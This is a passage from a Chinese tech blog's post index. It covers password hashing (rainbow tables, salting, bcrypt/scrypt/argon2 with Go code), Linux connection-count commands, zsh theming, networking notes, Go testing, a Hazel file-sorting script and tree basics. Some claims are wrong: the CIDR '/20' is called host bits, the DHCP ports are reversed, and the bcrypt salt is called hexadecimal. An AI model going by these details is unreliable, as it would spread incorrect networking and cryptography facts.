暴力枚举法：简单粗暴地枚举出所有原文，并计算出它们的哈希值，看看哪个哈希值和给定的信息摘要一致。\n\n+ 字典法：黑客利用一个巨大的字典，存储尽可能多的原文和对应的哈希值。破解时通过密文直接反查明文。但存储一个这样的数据库，空间成本是惊人的。\n\n+ 彩虹表（rainbow）法：在字典法的基础上改进，以时间换空间。是现在破解哈希常用的办法。\n\n  \n\n  虽然彩虹表有着如此惊人的破解效率，但网站的安全人员仍然有办法防御彩虹表。最有效的方法就是“加盐”，即在密码的特定位置插入特定的字符串，这个特定字符串就是“盐（Salt）”，加盐后的密码经过哈希加密得到的哈希串与加盐前的哈希串完全不同，黑客用彩虹表得到的密码根本就不是真正的密码。即使黑客知道了“盐”的内容、加盐的位置，还需要对H函数和R函数进行修改，彩虹表也需要重新生成，因此加盐能大大增加利用彩虹表攻击的难度。\n  \n\n\n\n# 3. Bcrypt加密\n\nBcrypt内部自己实现了随机加盐处理。使用Bcrypt，每次加密后的密文是不一样的。对一个密码，Bcrypt每次生成的hash都不一样，那么它是如何进行校验的？\n\n虽然对同一个密码，每次生成的hash不一样，但是hash中包含了salt（hash产生过程：先随机生成salt，salt跟password进行hash）；\n\n在下次校验时，从hash中取出salt，salt跟password进行hash；得到的结果跟保存在DB中的hash进行比对。\n\n举个栗子，假如一个密文是 `$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa`, 那么通过 `$` 分隔符我们可以得到下面三个信息:\n\n1. `2a` 表示的是用于此次计算的 bcrypt 算法版本；\n2. `10` 表示的是 `log_rounds` 值；\n3. `vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa` 是 salt 和加密文本的拼接值 (经过了 base 64 编码，前面 22 个字母是 salt 的十六进制值。\n\n\n\n# 4. PBKDF2，Scrypt，Bcrypt 和 ARGON2对比\n\n+ PBKDF2\n\nPBKDF2 被设计的很简单，它的基本原理是通过一个伪随机函数（例如 HMAC 函数），把明文和一个盐值作为输入参数，然后按照设置的计算强度因子重复进行运算，并最终产生密钥。\n\n这样的重复 hash 已经被认为足够安全，但也有人提出了不同意见，此类算法对于传统的 CPU 来说的确是足够安全，使用GPU阵列、或FPGA来破解PBKDF2仍相对容易。注意这里说的是相对，为了比较接下来提到的另外两种算法。\n\n+ BCrypt\n\nBCrypt 在1999年发明，由于使用GPU、FPGA的破解是基于它们相对于CPU的并行计算优势，因此BCrypt算法不仅设计为CPU运算密集，而且是内存IO密集。\n\n然而随着时间迁移，目前新的FPGA已经集成了很大的RAM（类型CPU缓存、大约几十兆），解决了内存密集IO的问题。\n\n+ Scrypt\n\nScrypt 于2009年产生，弥补了BCrypt的不足。它将CPU计算与内存使用开销提升了一个层次，不仅CPU运算需要指数时间开销，还需要指数内存IO开销。\n\n+ Argon2\n\nArgon2 有两个主要的版本：**Argon2i** 是对抗侧信道攻击的最安全选择，而 **Argon2d** 是抵抗 GPU 破解攻击的最安全选择。\n\n在 2019 年，我建议你以后不要使用PBKDF2 或 BCrypt，并强烈建议将 Argon2（最好是 **Argon2id**）用于最新系统。\n\nScrypt 是当 Argon2 不可用时的不二选择，但要记住，它在侧侧信道泄露方面也存在相同的问题。\n\n  \n\n# 5. 代码实现\n\n+ pbkdf2 不推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"crypto/sha256\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/pbkdf2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res1)) //'J!85|LU@\n  \n  \t// 加密后一样\n  \tres2 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res2)) //'J!85|LU@\n  \n  }\n  ```\n\n  \n\n+ bcrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/bcrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \t\n    // cost默认是10,不要太小\n  \tres1, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res1)) //$2a$10$Y85p96ZRD1Sa5iU7M/ngku9MIFNkmAwEI38FvPT9dj628E8hPOU0K\n  \n  \t// 加密结果不一样\n  \tres2, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res2)) //$2a$10$7xUWgmWB3te5OipBYx4aheUFz7dCcj7JLIpQW6D/Me1R4qljEIFy2\n  \n  \terr1 := bcrypt.CompareHashAndPassword(res1, []byte(passwd))\n  \tfmt.Println(err1) //nil\n  \n  \terr2 := bcrypt.CompareHashAndPassword(res1, []byte(\"random\"))\n  \tfmt.Println(err2) //crypto/bcrypt: hashedPassword is not the hash of the given password\n  }\n  ```\n\n+ scrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/scrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := []byte{0xc8, 0x28, 0xf2, 0x58, 0xa7, 0x6a, 0xad, 0x7b}\n  \n  \tres1, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res1)) //TCoi[DRt;IALuw}\n  \n  \tres2, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res2)) //TCoi[DRt;IALuw}\n  }\n  ```\n\n  \n\n+ argon2 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"encoding/base64\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/argon2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res1)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  \n  \tres2 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res2)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  }\n  ```\n\n\n\n\n# 6. 数据库存储\n\n如果存储慢哈希的密码, 一般都是存储定长的. 如`char(60)`\n\n参考: https://stackoverflow.com/questions/247304/what-data-type-to-use-for-hashed-password-field-and-what-length/\n\n\n\n# 7. 参考资料\n\n+  https://draveness.me/whys-the-design-password-with-md5/\n\n+ https://github.com/luokuning/blogs/issues/9\n\n+ https://juejin.im/post/5e70c152518825491949886e\n\n+ https://www.jianshu.com/p/732d9d960411","tags":["密码"],"categories":["计算机基础"]},{"title":"查看linux连接数和状态","url":"%2Fp%2F26be861f.html","content":"\n# 1. Netstat 命令\n\n### 1.1 查看 TCP 连接数及状态\n\n```bash\nnetstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'\n\n\nESTABLISHED 1028\nFIN_WAIT1 1\nTIME_WAIT 3314\n```\n\n<!-- more -->\n\n### 1.2 查看状态的次数\n\n```bash \nnetstat -an | grep ESTABLISHED | wc -l\n1215\n\nnetstat -an | grep TIME_WAIT | wc -l\n4678\n\n```\n\n### 1.3 连接到其他服务器数量\n\n```bash\n# tu的意思只查询tcp 和 udp\nnetstat -ntu| awk  '{print $4}' | sort | uniq -c | sort -nr | head\n\n 53 172.31.41.180:9061\n 45 172.31.41.180:9038\n 36 127.0.0.1:9093\n 29 127.0.0.1:9082\n 24 127.0.0.1:9051\n 22 127.0.0.1:9038\n 20 127.0.0.1:9091\n 19 127.0.0.1:9041\n 15 172.31.41.180:9082\n 11 127.0.0.1:9030\n\nnetstat -ntu| grep ESTABLISHED | awk  '{print $4}' | sort | uniq -c | sort -nr | head\nnetstat -ntu| grep TIME_WAIT | awk  '{print $4}' | sort | uniq -c | sort -nr | head\n\n```\n\n### 1.4 连接到本机的数量\n\n```bash \nnetstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \n\n2987 127.0.0.1\n1118 172.31.1.150\n453 172.31.26.159\n 90 172.31.20.166\n 84 172.31.52.62\n 75 172.31.41.180\n 44 172.31.31.250\n 29 172.31.0.230\n 26 172.31.18.56\n 23 3.101.114.45\n\n\nnetstat -ntu | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \nnetstat -ntu | grep TIME_WAIT | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head \n```\n\n# 2. SS 命令\n\n### 2.1 查看 TCP 的连接状态\n\n```bash\nss  -tan|awk 'NR>1{++S[$1]}END{for (a in S) print a,S[a]}'\n\n\nLISTEN 35\nESTAB 986\nTIME-WAIT 3560\n```\n\n### 2.2 查看 socket 的概要统计信息\n\n```bash\nss -s\n\n\nTotal: 884\nTCP:   4392 (estab 667, closed 3690, orphaned 0, timewait 3687)\n\nTransport Total     IP        IPv6\nRAW       1         0         1\nUDP       4         3         1\nTCP       702       404       298\nINET      707       407       300\nFRAG      0         0         0\n\n```\n\n# 3. 参考资料\n\n- https://www.jianshu.com/p/e72ed5504b0c\n- https://learnku.com/articles/24360\n- https://wangchujiang.com/linux-command/c/ss.html\n","tags":["linux"],"categories":["系统"]},{"title":"zsh主题powerlevel9k升级到powerlevel10k","url":"%2Fp%2F4fd520f9.html","content":"\n\n\n为什么升级？\n\nPowerlevel9k项目不再维护，Powerlevel10k更快更强大（10-100倍的性能提升）。\n\nPowerlevel10k并且完美兼容Powerlevel9k, 以前的配置参数可以不用任何修改.\n\n<!-- more -->\n\n### 1. 替换\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k\n\n# Replace ZSH_THEME=\"powerlevel9k/powerlevel9k\" with ZSH_THEME=\"powerlevel10k/powerlevel10k\".\n```\n\n\n\n### 2. 配置\n\n可以通过 `p10k configure` 安装推荐字体. 也可以`p10k configure`进行傻瓜式主题配置. 不过还是建议自己定制.\n\n```\np10k configure\n```\n\n\n\n### 3. 我的配置\n\n```yaml\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# 看颜色\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/romkatv/powerlevel10k\n+ https://www.liuvv.com/p/6600d67c.html\n\n","tags":["zsh"],"categories":["终端"]},{"title":"计算机网络简明教程","url":"%2Fp%2F57254ff8.html","content":"\n\n\n# 1. MAC地址\n\n是对网络上各接口的唯一标识, 注意而不是设备的唯一标识\n\n因为普通电脑就有线网卡和无线网卡, 交换机和路由器更是有多个 mac 地址\n<!-- more -->\n\n\n+ 单播 mac 地址  就是查看自己是否匹配, 匹配接受\n\n+ 广播 mac 地址  FF-FF-FF-FF-FF-FF, 接受\n\n+ 多播 mac 地址 看自己的是否在这个多播租, 在的话接受\n\n\n\n# 2. IP 地址\n\n在数据包的转发过程中, 源 ip地址和目的 ip 地址不变, 源 mac 地址和目的 mac 地址一直变\n\n\n\n# 3. ARP协议\n\n每个主机有自己的 arp 缓存表,  不知道别人的就需要发送 arp 报文\n\narp 缓存表有类型, 静态和动态,  一般是动态, 两分钟失效, 因为有可能你换 ip\n\narp 只能在同一个网络中使用, 不能跨网络询问\n\n\n\n# 4. 集线器和交换机\n\n集线器给以太网每个设备发送(物理层)\n\n交换机给目的主机发送(数据链路层,也包括物理层)\n\n\n\n集线器和交换机组成的网络属于同一个广播域,就是广播的都能收到\n\n交换机通过自学习的方法, 记录主机 mac 地址所对应的接口号\n\n\n\n为了以太网稳定, 一般冗余交换机线路连接, 但是有可能发生广播风暴(环), 可以通过生成树协议STP ,避免环路(最小生成树)\n\n\n\n# 5. VALN\n\n一个或多个交换机,不同的接口划分成多个 VLAN\n\n通过 VLAN缩小广播域, 还可以用路由器隔离广播域\n\n交换机接口类型: Access, Trunk, Hybrid(华为)\n\nVLAN 设置, 和主机连接的交换机用 ACCESS端口, 交换机互联的端口用 Trunk 端口\n\n\n\n# 6. IPV4\n\n### 6.1 分类编址\n\n网络号+主机号 4个字节32位\n\nA 类 0-127    网络号1个字节\n\nB 类 128-191  网络号2个字节\n\nC 类 192-223 网络号3个字节\n\nD 类  多播地址\n\nE 类  保留使用\n\n### 6.2 划分子网\n\n从主机号借用一部分给子网号,  有种从B类降级到C类的感觉\n\n子网掩码, 前面1代表网络号, 0代表主机号, 然后逻辑与运算, 得到子网的网络地址(网络起始的地址,xxx.xxx.xxx.0)\n\nC 类地址默认子网掩码就是255.255.255.0\n\n### 6.3 无分类编址\n\n忘记前两种方法\n\n128.14.35.7/20 表明20个是主机号\n\n\n\n![1](计算机网络简明教程/1.png)\n\n\n\n根据无分类, 路由选择最长前缀匹配, 认为越长,路由更具体\n\n\n\n# 7. IP数据报\n\n给别人发数据报, 先看自己和别人的网络地址是否一样, 不一样就不在一个网络, 要发给默认网关\n\n默认网关: 指定的转发路由器的 IP 地址\n\n到达路由器时, 检查路由条目, 匹配到正确的网络地址后转发\n\n路由器不转发广播地址\n\n\n\n### 7.1 路由表\n\n默认路由 0.0.0.0/0, \t\t\t\t 网络前缀最短,最模糊, 选择优先级最低\n\n特定路由 198.168.1.2/32        网络前缀最长,最具体, 选择优先级最高\n\n\n\n因为有默认路由的存在(少了路由条目发给默认路由, 不存在的网络也给默认路由), 容易发生路由环路的问题, 所以 IP 数据报有 TTL , 变成0了就丢弃\n\n\n\n### 7.2 路由选择协议\n\n一个网络,组成自治系统 AS\n\n两个AS 之间用外部网关协议 EGP\n\nAS内部用内部网关协议 IGP\n\n![1](计算机网络简明教程/2.png)\n\n\n\n##### 7.2.1 RIP 内部网关,UDP\n\n经过一个路由+1, 认为越短的路由就是好的路由, 跳数大于15,表明不可达\n\n如果距离一样, 可以负载均衡\n\n\n\n路由器仅和相邻路由器周期交换路由信息\n\n![1](计算机网络简明教程/3.png)\n\n\n\n##### 7.2.2 OSPF 内部网关,IP\n\n克服 RIP 缺点,1989年开发出\n\n路由器之间有代价, 采用最短路径算法(迪杰斯特拉)\n\n\n\n##### 7.2.3 BGP 外部网关,tcp\n\n只是能找到到达的比较好路由, 不是最佳路由\n\n不同的 AS自治系统发言人建立 tcp 连接,交流信息\n\n\n\n# 8. ipv4首部格式\n\n固定20字节+ 40字节可变部分\n\n### 8.1 固定20字节\n\n+ 版本4bit + 首部长度(4字节的整数倍) 4bit +区分服务 8bit + 总长度(首部+数据) 16bit \n+  标识 标志 片偏移   三个用于 ip数据报分片\n+ 生存时间TTL(以跳数对单位)协议8bit +   协议8bit(1 icmp 2 igmp 6tcp 17udp 41ipv6 89 ospf) + 首部检验和16bit(检测首部是否出错, ipv6不再检验)\n+ 源 IP地址  32bit\n+ 目的 IP地址 32bit\n\n\n\n### 8.2 IP数据报分片\n\n以太网数据载荷部分最大1500字节的限制(MTU), IP数据报太大的话, 需要分片发送\n\n![1](计算机网络简明教程/4.png)\n\n\n\n# 9. ICMP网际控制报文协议\n\n封装在 IP 数据报中发送, 向源点报错  和 向其他主机询问\n\n+ 差错报告报文\n  + 终点不可打\n  + 源点抑制\n  + 时间超过\n  + 参数问题\n  + 改变路由\n\n+ 询问报文\n  + 回送请求和回答 \n    + ping 命令, 不通过 tcp 和 udp  \n    +  tracert 命令, 用来看经过哪些路由器\n  + 时间戳请求和回答\n\n\n\n# 10. 虚拟专用网vpn和 网络地址转换NAT\n\n### 10.1 私有地址\n\n+ 10.0.0.0/8\n+ 172.16.0.0/12\n+ 192.168.0.0/16\n\n### 10.2 不同局域网间的发送\n\n+ 路由器不转发私有地址\n\n+ 所以对内部 IP数据报, 进行加密, 再次套一个首部, 写上公网地址\n+ 又叫 IP 隧道技术\n\n### 10.3 NAT\n\n+ 路由器上安装 NAT 软件\n+ 到路由器的时候,转换全球地址, 记录在路由器的 NAT转换表里\n+ NAPT路由器, 将端口号和 IP 地址一起转换\n+ NAT, 外网不能主动发起到内网的主机, 内网主机不能充当服务器, 如果可以,就要特殊穿透技术\n\n> # 运输层\n\n# 11. 运输层\n\n### 11.1 端口号  0-65535\n\n+ 熟知端口号 0-1023 个人不能用\n+ 登记端口号 1024-49151 也得IANA登记\n+ 短暂端口号 49152-65535 \n\n### 11.2 发送复用和接收分用\n\n![1](计算机网络简明教程/5.png)\n\n\n\n> # 数据链路层\n\n# 12. 数据链路层\n\n#### 12.1 封装成帧\n\n添加帧头, 添加帧尾来标志\n\n如果数据里面有帧的定界标志, 就对数据进行一个转义, 否则会认为错误的结束位置\n\n帧的最大数据长度有限制, 叫做 MTU\n\n#### 12.2 差错检测\n\n![1](计算机网络简明教程/6.png)\n\n\n\n+ 奇偶校验\n  + 在数据后面添加1位奇偶校验位, 使1的个数为奇数或偶数\n  + 不靠谱, 一半的失误率\n\n+ CRC 校验\n\n  ![1](计算机网络简明教程/7.png)\n\n  ![1](计算机网络简明教程/8.png)\n\n#### 12.3 可靠传输\n\n+ 一般链路层在有线以太网不实现可靠传输, 无线局域网信号差, 实现可靠传输\n\n+ 停止等待协议SW\n\n  + 信道利用率特别低\n\n    ![1](计算机网络简明教程/9.png)\n\n\n+ 回退 N 帧协议GBN \n\n  + 通过发送窗口发送, 累计确认增大效率\n  + 但是发送5个, 第1个出错, 会连累剩下的4个, 造成5个都需要重传, 差的情况下效率也不高\n  + 接收窗口只能是1\n\n\n+ 选择重传协议SR\n\n  + 接收窗口大于1, 有了缓存\n  + 不能累计确认,只能逐一确认\n\n\n\n# 13 数据链路层协议\n\n#### 13.1 点对点协议 PPP\n\n不提供可靠传输服务\n\n\n\n> # 应用层\n\n# 20. DHCP \n\ndhcp 服务端口udp 68,  客户端 udp 67\n\ndhcp 服务器, 一般集成在路由器里\n\n客户通过 dhcp 客户端向 dhcp 服务器请求, 得到 IP租用, 时间过了一半后,重新发送租用请求\n\n在使用的时候需要用 arp 请求确定 ip 未被占用","tags":["网络"],"categories":["网络"]},{"title":"golang测试单个文件或函数","url":"%2Fp%2F401250d7.html","content":"\n### 1. 测试单个文件或函数\n\n测试一个文件\n\n```bash\ngo test -v hello_test.go\n```\n\n\n\n测试一个函数\n\n```bash\ngo test -v  -test.run=\"TestA\"  \n```\n\n<!-- more -->\n\n注意在测试单个文件时, 会出现未定义的情况, 这是因为定义在其他文件里, 需要加上定义的文件.\n\n```bash\ngo test -v hello.go hello_test.go\n```\n\n\n\n而测试单个函数不存在这个问题, 可以在一个文件内用相同的前缀命名测试函数, 然后用正则表达式去测试.\n\n如:\n\n```bash\ngo test -v  -test.run=\"TestA*\"  \n```\n\n\n\n### 2. 测试覆盖率\n\n```bash\ngo test -v -coverprofile=a.out -test.run=\"TestA*\" # 把测试结果保存在 a.out\n\ngo tool cover -html=./a.out  # 通过浏览器打开, 可以看到覆盖经过的函数\n```\n\n\n\n### 3. 总结\n\n不写单元测试的代码都是耍流氓.","tags":["golang"],"categories":["4_golang实战"]},{"title":"hazel整理神器","url":"%2Fp%2F1d0d22af.html","content":"\nhazel 是一款可以自动监控并整理文件夹的工具，其官网的介绍就是简单的一句话：Automated Organization for Your Mac。\n\n它的使用有点类似于网络服务 IFTTT，你可以设定一个 if 条件，如果被监控的文件夹出现符合条件的项，那么对其执行 then 的操作（也可以通过邮箱的收件过滤规则来理解）。\n\n<!-- more -->\n\n# 1. hazel\n\nhazel能做什么呢？\n\n例如可以根据文件创建的时间，自动将文件进行颜色标记。自动的用特定软件打开某个特定文件、根据文件的类型自动转移到相应的文件夹中、自动帮你整理照片可以按照「年-月」来分类存储到相应文件夹、自动把文件夹中的内容上传到 FTP 等网络服务中等等。。\n\n再加上hazel 支持 AppleScript、JavaScript、Automator workflow 等代码指令，令其扩展性更上一层楼，可以做到的事情也可以说只剩下想象力这道门槛了。\n\n### 1.1 界面\n\n左边是监控的文件夹，中间是规则列表，右边是规则的设置。\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505101952417.png\" alt=\"image-20220505101952417\" style=\"zoom:47%;\" />\n\n此时设置的是文件添加时间在最后匹配时间之前（新文件添加后暂未被匹配，所以一定是早于匹配时间），就是新增加文件设置蓝色标签。\n\n### 1.2 条件的嵌套使用\n\n图中使用了嵌套条件，具体的操作是鼠标长按右侧加号（也可按住 Option 后点击），即可增加嵌套条件组。\n\n可以看到下图有 3个if，像写代码一样。\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505102832037.png\" alt=\"image-20220505102832037\" style=\"zoom: 50%;\" />\n\n### 1.3 查看log\n\n在做所有操作的时候，可以点击 Help->View Logs 看执行步骤。\n\n\n\n# 2. 场景使用\n\n### 2.1 选择标签来下发指令\n\n添加Tags方式一定要使用快捷键才能完成，我个人把加Tags的快捷设置为：command+e\n\n关于给标签加快捷键的方法，请参考：https://medium.com/innovation-design/how-to-add-a-shortcut-for-finder-tags-on-macos-mojave-65d1502ffd98\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505110632784.png\" alt=\"image-20220505110632784\" style=\"zoom:50%;\" />\n\n通过选择标签下发指令还有个最大优势是：同时操作多个文件。一次性为多个不同类型文件下达指令后，所有文件便能自己找到方向各归其所。\n\n\n\n### 2.2 标签规则\n\n<img src=\"hazel%E6%95%B4%E7%90%86%E7%A5%9E%E5%99%A8/image-20220505114307967.png\" alt=\"image-20220505114307967\" style=\"zoom:40%;\" />\n\n如上图，我们把触发条件设置成只要Tags里包含Dropbox 便会触发下面的执行步骤。\n\n1. 系统会run shell script，这个脚本的作用使把文件归类到它的“大本营”。\n2. 移除 Tag Dropbox ，目的是避免Hazel条件二次触发。\n3. 规则文件，把_root 换成自己的文件夹。\n\n```bash\n_root=~/Dropbox/3_SORT/\n_sortIntoSubfolderByKind=1\n\nsmartMv(){\nif [ -z \"$1\" ]\n  then\n    echo \"No argument supplied\"\n    exit\nfi\n\n\n# Variable definitions start\nfile=$1 # file path\n_root=$2 # root directory\nsortByKind=$3 # if needed sort by kind in Folders\nfileName=$(basename -- \"$file\")\npwd=$(pwd)\n# Variable definitions ended\n\n# function defined\nmv_no_override() {\n    local dir file ext base num\n    if [ -d \"$2\" ]; then\n        dir=$2\n        file=$(basename \"$1\")\n    else\n        dir=$(dirname \"$2\")\n        file=$(basename \"$2\")\n    fi\n    ext=\"$(sed -r 's/.+(\\..+)|.*/\\1/' <<<\"$file\")\"\n    base=\"$(sed -r 's/(.+)\\..+|(.*)/\\1\\2/' <<<\"$file\")\"\n    while [ -e \"$dir/$base$num$ext\" ]; do\n        (( num++ ))\n    done\n    mv \"$1\" \"$dir/$base$num$ext\"\n    echo \"move file $pwd/$1 ->\" \"$dir/$base$num$ext\" \"success\"\n}\n\n\nmoveTO(){\n  if [ ! -d \"$2\" ];then # if folder exist\n    mkdir -p \"$2\"\n  fi\n  mv_no_override \"$1\" \"$2/${3}\"\n\n}\nmdlsFormat(){ # format result for `mdls`\n  echo `mdls -name $1 $2 | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'`\n}\nmdlsFormatUTI(){\n  echo `mdls -name $1 $2 | cut -d \"=\" -f 2 | sed 's/,//' | sed 's/)//' | sed 's/(//'`\n}\n# function defined ended\n\n\n# Classification according to utiTree start\nutiTree=(`mdlsFormatUTI kMDItemContentTypeTree $file`)\nfor uti in $utiTree\ndo\n  _uti=`echo $uti | sed 's/\\\"//g'`\n\n  case $_uti in\n    public.source-code)\n    _basePath=${_root}Source-code/\n    break\n    ;;\n    public.composite-content)\n    _basePath=${_root}Documents/\n    break\n    ;;\n    public.presentation)\n    _basePath=${_root}Presentations/\n    break\n    ;;\n    public.disk-image)\n    _basePath=${_root}Disk-images/\n    break\n    ;;\n    public.archive)\n    _basePath=${_root}Archives/\n    break\n    ;;\n    public.movie)\n      _basePath=${_root}Videos/\n      break\n    ;;\n    public.audio)\n      _basePath=${_root}Audios/\n      break\n    ;;\n    public.image)\n      _basePath=${_root}Pictures/\n      break\n    ;;\n    public.plain-text)\n     _basePath=${_root}Documents/\n     break\n    ;;\n    public.folder)\n    _basePath=${_root}Folders/\n    break\n    ;;\n    *)\n    echo other \"$_uti\"\n    _basePath=${_root}Others/\n    ;;\n  esac\ndone\n# Classification according to utiTree ended\n\n# fix basePath by extension\nextension=\"${fileName##*.}\"\necho extension \"$extension\"\ncase $extension in\n  docx|xlsx)\n    _basePath=${_root}Documents/\n    ;;\n  pptx|ppt|key)\n    _basePath=${_root}Presentations/\n    ;;\n  archiver|7z|rar|gz)\n    _basePath=${_root}Archives/\n    ;;\nesac\n\n# rename start\nkMDItemContentCreationDate=$(mdlsFormat kMDItemContentCreationDate \"$file\")\n\nregexp=\"(^[0-9]{4}\\-[0-9]{2}\\-)\" # check file name\nif [[ $fileName =~ $regexp ]]\n  then\n    echo \"file name has date, don't rename\"\n  else\n    creationDatesFormat=$(date -j -f \" %Y-%m-%d %H:%M:%S %z\" \"$kMDItemContentCreationDate\" +%Y-%m-)\n    fileName=${creationDatesFormat}$fileName # rename file by adding creationTime\nfi\n# rename end\n\n# mv to folder start\nif [[ $sortByKind == 1 ]]\nthen\n  kind=$(mdlsFormat kMDItemKind \"$file\")\n  destination=${_basePath}${kind}\n  moveTO \"$file\" \"${destination}\" \"${fileName}\" # sort to finder by kind\nelse\n  moveTO \"$file\" \"$_basePath\" \"${fileName}\" # move to basePath\nfi\n\n# mv to folder end\n\n}\n\nsmartMv \"$1\" \"$_root\" $_sortIntoSubfolderByKind\n```\n\n\n\n解释：\n\n```bash\n# 获取类型\nmdls -name kMDItemContentTypeTree ~/test.txt | cut -d \"=\" -f 2 | sed 's/,//' | sed 's/)//' | sed 's/(//'\n\"public.item\"\n\"public.text\"\n\"public.data\"\n\"public.content\"\n\"public.plain-text\"\n\n\n# 获取日期\nmdls -name kMDItemContentCreationDate ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\n2021-11-09 15:53:04 +0000\n\n# 获取类型\nmdls -name kMDItemKind ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\n纯文本文稿\n\n# 获取文件名\nmdls -name kMDItemFSName ~/test.txt | cut -d \"=\" -f 2 | sed 's/\\\"//g' | sed -e 's/^[[:space:]]*//'\ntest.txt\n```\n\n\n\n# 3. 实用操作\n\n### 3.1 递归进入文件夹执行操作\n\n<img src=\"hazel整理神器/1.png\" alt=\"1\" style=\"zoom: 40%;\" />\n\n<img src=\"hazel整理神器/2.png\" alt=\"2\" style=\"zoom:40%;\" />\n\n### 3.2  自动日期归类到子文件夹\n\n文件夹顺序：扩展 +  年 + 月 \n\n注意，两个`date modified` 修改为特定的年或月。中间加个右三角符号，是子文件夹的意思。\n\n<img src=\"hazel整理神器/3.png\" alt=\"3\" style=\"zoom:40%;\" />\n\n\n\n# 4. 参考资料\n\n+ https://sspai.com/post/35212\n+ https://eurychen.me/post/solutions-of-macos-file-management/","tags":["mac"],"categories":["软件"]},{"title":"树的介绍和分类","url":"%2Fp%2Fd354593e.html","content":"\n# 1. 树\n\n在自然界和日常生活中，可以见到很多情形可以归结为树结构。如：家族谱系、行政管理机构、Windows磁盘文件管理系统等。\n\n自然界的树是树根朝下，枝干和叶子向上生长，而我们讨论的树在生长方向上正好与其相反，它是倒长的树，即根朝上，枝干和叶子朝下。\n\n<!-- more -->\n\n### 1.1 定义\n\n树（Tree）是n（n≥0）个结点的有限集合。它满足：\n（1）仅有一个特定的结点，称为根（root）结点;\n（2）其余结点分为m(m≥0)个互不相交的非空有限集合   其中每个集合自身又是一棵树，称为根的子树（subtree）。\n\n本条即是说，树结点之间的路径不能形成回路，否则称为图\n\n+ 为了表述方便，把没有结点的树称为空树。\n+ 树的定义具有递归性：即一棵树是由根及若干棵子树构成的，而子树又是由根及若干棵子树构成的。\n\n### 1.2 树的基本术语\n\n+ 结点的度（degree）(就是直接的孩子有几个)\n\n  结点所拥有的子树的个数称为该结点的度，而树中各结点的度的最大值称为该树的度。\n\n  \n\n+ 叶子（leaf）结点和分支结点  (没有孩子的节点就是叶子节点)\n  + 度为0的结点称为叶子（终端）结点；度不为0的结点称为分支（非终端）结点。\n  \n  + 